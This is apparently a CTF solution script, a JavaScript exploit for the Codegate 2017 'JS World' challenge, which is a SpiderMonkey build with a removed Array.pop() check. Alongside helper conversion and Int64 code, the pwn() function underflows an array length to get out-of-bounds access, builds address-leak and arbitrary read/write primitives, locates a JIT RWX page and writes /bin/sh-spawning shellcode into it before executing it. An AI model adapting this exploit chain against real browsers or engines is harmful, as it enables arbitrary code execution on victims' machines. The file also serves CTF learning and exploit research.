

/**
 * JS World from Codegate 2017 prequals: https://ctftime.org/task/3410
 * 64-bit MozJS (Firefox) exploit chall.
 * Stripped, full RELRO, PIC.
 *
 * The bug is introduced by eliminating a safety check in Array.pop().
 * Can underflow lengths now very easily.
 *
 * mozjs-24.2.0
 */

// Array.from isn't implemented so...courtesy of Mozilla

// Production steps of ECMA-262, Edition 6, 22.1.2.1
if (!Array.from) {
  Array.from = (function () {
    var toStr = Object.prototype.toString;
    var isCallable = function (fn) {
      return typeof fn === 'function' || toStr.call(fn) === '[object Function]';
    };
    var toInteger = function (value) {
      var number = Number(value);
      if (isNaN(number)) { return 0; }
      if (number === 0 || !isFinite(number)) { return number; }
      return (number > 0 ? 1 : -1) * Math.floor(Math.abs(number));
    };
    var maxSafeInteger = Math.pow(2, 53) - 1;
    var toLength = function (value) {
      var len = toInteger(value);
      return Math.min(Math.max(len, 0), maxSafeInteger);
    };

    // The length property of the from method is 1.
    return function from(arrayLike/*, mapFn, thisArg */) {
      // 1. Let C be the this value.
      var C = this;

      // 2. Let items be ToObject(arrayLike).
      var items = Object(arrayLike);

      // 3. ReturnIfAbrupt(items).
      if (arrayLike == null) {
        throw new TypeError('Array.from requires an array-like object - not null or undefined');
      }

      // 4. If mapfn is undefined, then let mapping be false.
      var mapFn = arguments.length > 1 ? arguments[1] : void undefined;
      var T;
      if (typeof mapFn !== 'undefined') {
        // 5. else
        // 5. a If IsCallable(mapfn) is false, throw a TypeError exception.
        if (!isCallable(mapFn)) {
          throw new TypeError('Array.from: when provided, the second argument must be a function');
        }

        // 5. b. If thisArg was supplied, let T be thisArg; else let T be undefined.
        if (arguments.length > 2) {
          T = arguments[2];
        }
      }

      // 10. Let lenValue be Get(items, "length").
      // 11. Let len be ToLength(lenValue).
      var len = toLength(items.length);

      // 13. If IsConstructor(C) is true, then
      // 13. a. Let A be the result of calling the [[Construct]] internal method 
      // of C with an argument list containing the single item len.
      // 14. a. Else, Let A be ArrayCreate(len).
      var A = isCallable(C) ? Object(new C(len)) : new Array(len);

      // 16. Let k be 0.
      var k = 0;
      // 17. Repeat, while k < len… (also steps a - h)
      var kValue;
      while (k < len) {
        kValue = items[k];
        if (mapFn) {
          A[k] = typeof T === 'undefined' ? mapFn(kValue, k) : mapFn.call(T, kValue, k);
        } else {
          A[k] = kValue;
        }
        k += 1;
      }
      // 18. Let putStatus be Put(A, "length", len, true).
      A.length = len;
      // 20. Return A.
      return A;
    };
  }());
}

/* Conversion Utilities. */

let convF = new Float64Array(1);
let convU = new Uint32Array(convF.buffer);
let convB = new Uint8Array(convF.buffer);

/* [lo, hi] */
function float2long(floatarg){
	convF[0] = floatarg;
	return [convU[0], convU[1]];
}

function long2float(lo, hi){
	convU[0] = lo;
	convU[1] = hi & ~(0xffff8000);
	if (convU[1] != hi){
		print("Tag removed.");
	}
	return convF[0];
}

/**
 * I'm honestly unsure of how well long.js should work on such an old version,
 * but saelo's Int64 code seems to checkout. So I'll use it here.
 */

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

/**
 * Was helpful to track exactly what we're reading and writing in memory.
 *
 * JSArray = JSObject {
 * 		HeapPtrShape shape_;
 * 		HeapPtrType type_;
 * 		HeapSlot *slots;
 * 		HeapSlot *elements;
 *
 *  	// JSFunction
 *  	nargs, flags;
 *  	JSscript script_ || Native;
 *  	js::LazyScript || jitinfo;
 *
 *  	
 * 	} // At this point, same C++ class, different use.
 *
 * 	JSscript {
 *		bindings;
 *		jsbytecode *code; //uint8*
 *		uint8 *data;
 *		...
 * 	}
 * 		
 */

function pwn(){

	try{
		let victim = Math.min;
		x = [0xdeadc0de, 0xc001d00d, 1,2];
		y = [ victim, 0x1010101, 1,2];
		z = new Uint32Array(8);
		z[0] = 0xd00dd00d; z[1] = 0x20022002;

		while (x.length < 5){
			x.pop();
		}

		print("Size is now HUGE! We can OOB R/W...");

		for (let i = 6; i < 0x20; i++){
			let l = Int64.fromDouble(x[i]);
			print(l.toString());
		}
		

		print("Overwriting to test!");

		// Leak
		let heap_leak = Int64.fromDouble(x[9]);
		x[0x1d] = heap_leak.asDouble();

		function leakObj(obj){
			y[0] = obj;
			let heap_leak = Int64.fromDouble(x[9]);
			// Overwrite read location
			x[0x1d] = heap_leak.asDouble();
			let conv = long2float(z[0], z[1]);
			return Int64.fromDouble(conv);
		}

		function readUint32(addr){
			x[0x1d] = addr.asDouble();
			return z[0];
		}
		function readUint64(addr){
			let lo = readUint32(addr);
			let hi = readUint32(Add(addr, new Int64(4)));
			convU[0] = lo; convU[1] = hi;
			/*print( convB[0],convB[1], convB[2],convB[3], convB[4],convB[5],
				convB[6],convB[7]);*/
			return new Int64(convB);
		}

		function writeUint32(addr, val){
			x[0x1d] = addr.asDouble();
			z[0] = val;
		}

		let leak_min = leakObj(victim);
		print(leak_min.toString());

		if ( z[0] == 0xd00dd00d){
			throw "Overwrite failed...";
		}

		print("Leaked native object, now let's overwrite a pointer.");

		print("Let's JIT a big function to get RWX code space.");
		let f = function (a,b){
			a += a; a *= a; a -= b; a += a; a *= a;
			a -= b; a += a; a *= a; a -= b; a += a;
			a *= a; a -= b; a += a; a *= a; a -= b;
			a += a; a *= a; a -= b;
			return a * b
		}

		for (let i = 0; i < 0x1000; i++){
			f(i % 5, i%5);
		}

		let jitfunc = leakObj(f);
		print(jitfunc.toString());

		let script_offset = Add(jitfunc, new Int64(0x28));
		let script_addr = readUint64(script_offset);

		print("[+] Found script addr:" + script_addr.toString());

		let jit_func_offset = Add(script_addr, new Int64(0xb0));
		let jit_rwx_addr = readUint64(jit_func_offset);

		print("[+] Found jit function offset:" + jit_rwx_addr.toString());

		// Some shellcode, courtesy of Python + pwntools
		let shellcode = [ //0xcccccccc,
			0xb848686a, 0x6e69622f, 0x732f2f2f,
			 0xe7894850, 0x1697268, 0x24348101,
			 0x1010101, 0x6a56f631, 0x1485e08,
			 0x894856e6, 0x6ad231e6, 0x50f583b
		];

		for (let i = 0; i < shellcode.length; i++){
			writeUint32(Add(jit_rwx_addr, new Int64(i*4)), shellcode[i]);
		}

		print("[+] Written shellcode to the JIT!");
		print("[+] BOOM!");
		f();

		while(true){}
	} catch (e){
		print(e.toString());
	}
	
}

pwn();
